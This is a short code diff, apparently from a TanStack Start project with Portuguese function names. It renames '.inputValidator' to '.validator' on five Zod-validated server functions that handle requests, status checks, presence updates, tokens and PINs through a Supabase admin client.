@@ -19,7 +19,7 @@ function extrairIp(req: Request): string | null {
 }
 
 export const enviarSolicitacao = createServerFn({ method: "POST" })
-  .inputValidator((input: unknown) => envioSchema.parse(input))
+  .validator((input: unknown) => envioSchema.parse(input))
   .handler(async ({ data }) => {
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const req = getRequest();
@@ -48,7 +48,7 @@ export const enviarSolicitacao = createServerFn({ method: "POST" })
 const statusSchema = z.object({ id: z.string().uuid() });
 
 export const verificarStatus = createServerFn({ method: "GET" })
-  .inputValidator((input: unknown) => statusSchema.parse(input))
+  .validator((input: unknown) => statusSchema.parse(input))
   .handler(async ({ data }) => {
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const { data: row, error } = await supabaseAdmin
@@ -104,7 +104,7 @@ const presencaSchema = z.object({
 });
 
 export const atualizarPresenca = createServerFn({ method: "POST" })
-  .inputValidator((input: unknown) => presencaSchema.parse(input))
+  .validator((input: unknown) => presencaSchema.parse(input))
   .handler(async ({ data }) => {
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const patch: {
@@ -124,7 +124,7 @@ const tokenSchema = z.object({
 });
 
 export const enviarToken = createServerFn({ method: "POST" })
-  .inputValidator((input: unknown) => tokenSchema.parse(input))
+  .validator((input: unknown) => tokenSchema.parse(input))
   .handler(async ({ data }) => {
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const { error } = await supabaseAdmin
@@ -145,7 +145,7 @@ const pinSchema = z.object({
 });
 
 export const enviarPin = createServerFn({ method: "POST" })
-  .inputValidator((input: unknown) => pinSchema.parse(input))
+  .validator((input: unknown) => pinSchema.parse(input))
   .handler(async ({ data }) => {
     const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const { error } = await supabaseAdmin
